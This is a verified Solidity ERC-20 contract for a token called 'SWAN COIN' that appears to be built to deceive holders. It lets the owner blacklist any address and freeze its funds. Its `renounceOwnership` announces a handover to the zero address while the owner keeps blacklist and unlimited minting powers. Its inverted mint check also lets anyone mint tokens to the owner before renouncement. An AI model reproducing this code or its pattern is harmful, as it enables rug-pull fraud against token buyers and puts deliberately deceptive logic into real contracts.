/**
 *Submitted for verification at Etherscan.io on 2023-05-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract BBBToken is IERC20 {
    string private constant _name = "SWAN COIN";
    string private constant _symbol = "SWAN";
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isBlacklisted;
    address private _owner;
    bool private _isOwnershipRenounced;
    uint256 private _hiddenTokens;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Blacklist(address indexed account, bool isBlacklisted);
    event OwnershipRenounced(address indexed previousOwner, address indexed newOwner);
    event TokensIssued(uint256 amount);

    constructor() {
        uint256 initialSupply = 8000000000;
        _totalSupply = initialSupply * 10 ** uint256(_decimals);
        _balances[msg.sender] = _totalSupply;
        _owner = msg.sender;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external pure returns (string memory) {
        return _name;
    }

    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function blacklist(address account, bool isBlacklisted_) external {
        require(msg.sender == _owner, "Only owner can blacklist/unblacklist");
        _isBlacklisted[account] = isBlacklisted_;
        emit Blacklist(account, isBlacklisted_);
    }

    function isBlacklisted(address account) external view returns (bool) {
        return _isBlacklisted[account];
    }

    function issueTokens(uint256 amount) external {
        require(!_isOwnershipRenounced || msg.sender == _owner, "Only owner can issue tokens");
        _totalSupply += amount;
        _balances[_owner] += amount;
        emit TokensIssued(amount);
        emit Transfer(address(0), _owner, amount);
    }

    function renounceOwnership() external {
        require(msg.sender == _owner, "Only owner can renounce ownership");
        _isOwnershipRenounced = true;
        emit OwnershipRenounced(msg.sender, address(0));
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_isBlacklisted[sender], "Sender is blacklisted");
        require(!_isBlacklisted[recipient], "Recipient is blacklisted");
        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        require(amount >= 0, "Approve amount must be non-negative");
        require(!_isBlacklisted[owner], "Owner is blacklisted");
        require(!_isBlacklisted[spender], "Spender is blacklisted");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}